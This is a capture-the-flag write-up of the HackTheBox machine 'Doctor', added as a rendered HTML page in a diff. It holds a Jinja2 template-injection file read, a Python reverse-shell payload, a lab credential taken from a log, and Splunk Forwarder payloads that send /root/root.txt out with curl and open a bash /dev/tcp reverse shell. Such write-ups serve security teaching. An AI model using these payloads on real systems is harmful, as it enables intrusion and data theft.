@@ -1,0 +1,153 @@
+I"e<p><strong><center>Ref°: HTB-18-Boot2Root</center></strong></p>
+
+<p><img src="/assets/images/doctor/HTB-Badge-Doctor.png" alt="Desktop View" /></p>
+
+<p>— Doctor is a vulnerable machine through :</p>
+
+<ul>
+  <li>Foothold : Server Side Template Injection</li>
+  <li>Lateral movement : Credential in log file</li>
+  <li>Prives : Abusing Splunk Forwarder</li>
+</ul>
+
+<p><img src="/assets/images/doctor/HTB-Information-Doctor.png" alt="Desktop View" /></p>
+
+<h2 id="1-discovery---figure-out-environment"><strong><span style="color:#c0392b">[1] Discovery - Figure out environment</span></strong></h2>
+<h3 id="network-service-scanning">Network Service Scanning</h3>
+<hr />
+<p>We have the 3 following open ports : 22, 80, 8089</p>
+
+<p><img src="/assets/images/doctor/HTB-Images-Doctor-nmap.png" alt="Desktop View" /></p>
+
+<h3 id="website-on-port-80">Website on port 80</h3>
+<hr />
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://10.10.10.209/
+</code></pre></div></div>
+
+<p><img src="/assets/images/doctor/HTB-Images-Doctor-website.png" alt="Desktop View" /></p>
+
+<h3 id="docteur-secure-messaging-on-port-80">Docteur Secure Messaging on port 80</h3>
+<hr />
+<p>Other page can be resolve with doctors.htb:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://doctors.htb/login?next=%2F
+</code></pre></div></div>
+
+<p><img src="/assets/images/doctor/HTB-Images-Doctor-secure-messaging.png" alt="Desktop View" /></p>
+
+<h3 id="splunk-forwarder-on-port-8089">Splunk Forwarder on port 8089</h3>
+<hr />
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://doctors.htb:8089/
+</code></pre></div></div>
+
+<p><img src="/assets/images/doctor/HTB-Images-Doctor-splunk-forwarder.png" alt="Desktop View" /></p>
+
+<h2 id="2-weaponization---find-exploit-way"><strong><span style="color:#c0392b">[2] Weaponization - Find exploit way</span></strong></h2>
+<h3 id="archive-page-under-beta-testing">Archive page under beta testing</h3>
+<hr />
+<p>Reference: <a href="https://portswigger.net/web-security/server-side-template-injection">https://portswigger.net/web-security/server-side-template-injection</a></p>
+
+<p>Source page reveal page under beta testing:</p>
+
+<p><img src="/assets/images/doctor/HTB-Images-Doctor-source-page.png" alt="Desktop View" /></p>
+
+<p>This page is empty:</p>
+
+<p><img src="/assets/images/doctor/HTB-Images-Doctor-archive.png" alt="Desktop View" /></p>
+
+<p>But we can register new account and post anywant:</p>
+
+<p><img src="/assets/images/doctor/HTB-Images-Doctor-account.png" alt="Desktop View" /></p>
+
+<p><img src="/assets/images/doctor/HTB-Images-Doctor-post.png" alt="Desktop View" /></p>
+
+<p>And this archive page are updated with our post:</p>
+
+<p><img src="/assets/images/doctor/HTB-Images-Doctor-archive-test.png" alt="Desktop View" /></p>
+
+<p>We can determine the using of template language programmation in this website.</p>
+
+<p><img src="/assets/images/doctor/HTB-Images-Doctor-reveal-jinja2.png" alt="Desktop View" /></p>
+
+<p>The payload returns 7777777 and we can identify template used here: <code class="language-plaintext highlighter-rouge">Jinja2</code></p>
+
+<h2 id="3-foothold---get-into-the-target-"><strong><span style="color:#c0392b">[3] Foothold - Get into the target </span></strong></h2>
+<h3 id="server-side-template-injection-with-jinja2">Server Side Template Injection with Jinja2</h3>
+<hr />
+<p>Reference: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</a></p>
+
+<h4 id="get-remote-file">Get remote file</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.. get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() ..
+</code></pre></div></div>
+
+<p><img src="/assets/images/doctor/HTB-Images-Doctor-passwd.png" alt="Desktop View" /></p>
+
+<h4 id="gain-rce">Gain RCE</h4>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>..['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417) ..
+</code></pre></div></div>
+
+<p><img src="/assets/images/doctor/HTB-Images-Doctor-rce-1.png" alt="Desktop View" /></p>
+
+<h2 id="4-lateral-movement---move-through-environment"><strong><span style="color:#c0392b">[4] Lateral Movement - Move through environment</span></strong></h2>
+<h3 id="linpeas-reveal-password-in-varlogbackup">Linpeas reveal password in /var/log/backup</h3>
+<hr />
+
+<table>
+  <tbody>
+    <tr>
+      <td>![Desktop View]({ “/assets/images/doctor/HTB-Images-Doctor-linpeas.png”</td>
+      <td>relative_url })</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="su-shaun">su Shaun</h3>
+<hr />
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Username: Shaun
+Password: Guitar123
+</code></pre></div></div>
+
+<p><img src="/assets/images/doctor/HTB-Images-Doctor-su-shaun.png" alt="Desktop View" /></p>
+
+<h2 id="5-privilege-escalation---gain-higher-level-permissions"><strong><span style="color:#c0392b">[5] Privilege Escalation - Gain higher-level permissions</span></strong></h2>
+<h3 id="abusing-splunk-forwarders">Abusing Splunk Forwarders</h3>
+<hr />
+<p>References:</p>
+<ul>
+  <li><a href="https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/">https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/</a></li>
+  <li><a href="https://github.com/cnotin/SplunkWhisperer2">https://github.com/cnotin/SplunkWhisperer2</a></li>
+</ul>
+
+<p>Shaun account is used like UF agent –&gt; we can run arbitrary command on the server as root.</p>
+
+<p><img src="/assets/images/doctor/HTB-Images-Doctor-agent-password.png" alt="Desktop View" /></p>
+
+<h4 id="get-root-flag">Get root flag</h4>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python3 PySplunkWhisperer2_remote.py <span class="nt">--host</span> doctors.htb <span class="nt">--port</span> XXXX <span class="nt">--username</span> XXXX <span class="nt">--password</span> XXXX <span class="nt">--payload</span> <span class="s2">"curl -F 'data=@/root/root.txt' http://IP:PORT"</span> <span class="nt">--lhost</span> IP
+</code></pre></div></div>
+<p><img src="/assets/images/doctor/HTB-Images-Doctor-flag.png" alt="Desktop View" /></p>
+
+<h4 id="gain-rce-1">Gain RCE</h4>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>python3 PySplunkWhisperer2_remote.py <span class="nt">--host</span> doctors.htb <span class="nt">--port</span> XXXX <span class="nt">--username</span> XXXX <span class="nt">--password</span> XXXX <span class="nt">--payload</span> <span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1'"</span> <span class="nt">--lhost</span> IP
+</code></pre></div></div>
+
+<p><img src="/assets/images/doctor/HTB-Images-Doctor-rce-2.png" alt="Desktop View" /></p>
+
+<hr />
+
+<h1 id="trophy"><strong><center>Trophy</center></strong></h1>
+
+<blockquote>
+  <p><strong>I don’t know how to put this but I’m kind of a big deal. People know me. I’m very important. I have many leather-bound books and my apartment smells of rich mahogany</strong></p>
+
+  <p>Ron Burgundy</p>
+</blockquote>
+
+:ET
